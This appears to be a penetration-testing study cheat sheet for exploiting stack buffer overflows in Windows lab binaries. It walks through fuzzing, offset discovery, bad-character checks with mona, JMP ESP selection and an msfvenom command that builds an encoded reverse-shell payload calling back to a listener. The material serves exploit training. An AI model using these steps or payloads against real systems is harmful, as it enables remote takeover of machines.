### Buffer Overflows


#### The Process:
- 1 Spiking [finds the vulnerable command]
- 2 Fuzzing [attacks the specific command]
- 3 Finding the Offset [pattern_create.rb -l 9001]
- 4 Overwriting the EIP
- 5 Finding Bad Characters [ref: https://ostermiller.org/calc/asciism.html]
- 6 Finding the Right Module
- 7 Generating Shellcode
- 8 Root Access

-----

# BOF

- 1 Connect find commands
```bash
nc -nv $IP $PORT
```

- 2 [Spike](/1_method/3_Exploitation/1_Buffer_Overflows/2_STATS.spike)
check if vulnerable

- 3 [Fuzzing](/1_method/3_Exploitation/1_Buffer_Overflows/3_fuzzing_simple.py)
```bash
msf-pattern_create -l <length>
```
Record value on EIP, select ESP and click "Follow in Dump"  
```bash
msf-pattern_offset.rb -q <value> -l <length>  
```

- 4 [Find BadChars](https://github.com/cytopia/badchars)
- [badchars](/1_method/3_Exploitation/1_Buffer_Overflows/99_badchars.md)
- [badchars.py](/1_method/3_Exploitation/1_Buffer_Overflows/4_badchars.py)

Check bad characters after EIP. common bad characters are 0x00, 0x0A. 
Follow dump in ESP to check are there something missing after that.



```bash
ESP > Follow in dump
```


	- Remove badchars as they occur to find all badchars to exclude
	- "Step by step" - careful steps, shellcode will not work with badchars
		- better to be safe than sorry, remove chars if unsure
	- Step back and check if not gaining shell

> **NOTES: Using Mona for badchar generation**

```powershell
!mona config -set workingfolder C:\monastuff
!mona bytearray -cpb '"\x00"
!mona compare -f C:\monastuff\bytearray.bin -a [ESP value]
```

- 5 Use !mona to find the offset after the overflow

Confirm EIP by adding "B" * 4 after the number of offset. Also, add a number of "C" to track the number of characters that can be added after EIP to confirm length of shellcode


[mona modules](https://github.com/corelan/mona)
```powershell
C:\Program Files(x86)\Immunity Inc\Immunity Debugger\PyCommands
```
Load modules [find FALSE FALSE FALSE FALSE in security for dll]
```bash
!mona modules
```

```bash
msf-masm_shell
nasm > JMP ESP
00000000  FFE4              jmp esp
```
```
!mona find -s "\xFF\xE4" -m "essfunc.dll"
!mona jmp -r ESP -m "essfunc.dll"
```
note return addresses (which will then hold the shellcode) to push into EIP 
```
0x625011af
0x625011bb
0x625011c7
```
> Other

```bash

msf-nasm_shell
nasm > jmp esp
00000000  FFE4              jmp esp
JMP ESP = FFE4

# !mona jmp -r esp -cpb "\x00\x0A" << bad character
# !mona modules
# !mona find -s "\xff\xe4" -m brainpan.exe
```
check the value of the address by naviate to it.
Set breakpoint
Change "B" in EIP to the address of JMP ESP << little edian (reverse order)
e.g. 0x311712f3 >> "\xf3\x12\x17\x31"
Run again to check is the breakpoint triggered

shellcode / buffer in code is now:

```
"A" * [number of characters to EIP overwrite] + [JMP ESP location to push into EIP]
```

- 6 Follow address in Immunity debugger to test we are hitting the correct point
[offset.py](1_method/3_Exploitation/1_Buffer_Overflows/6_JMP_point.py)

```
->] 0x625011af
F2 # sets break point
```

- 7 Shellcode
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.101.13 LPORT=9001 EXITFUNC=thread -f c -a x86 -b "\x00" -e x86/shikata_ga_nai
```
> **NOTES: Running out of shell code space?**

Use the front of payload instead

1. Is there any register points to the front of our payload? EAX, EDX?
2. Check JMP register address
```
msf-nasm_shell JMP 
msf-nasm_shell EAX
msf-nasm_shell EBX
msf-nasm_shell ECX
msf-nasm_shell EDX
```
3. Append the address as shell code.
4. Add payload to the front







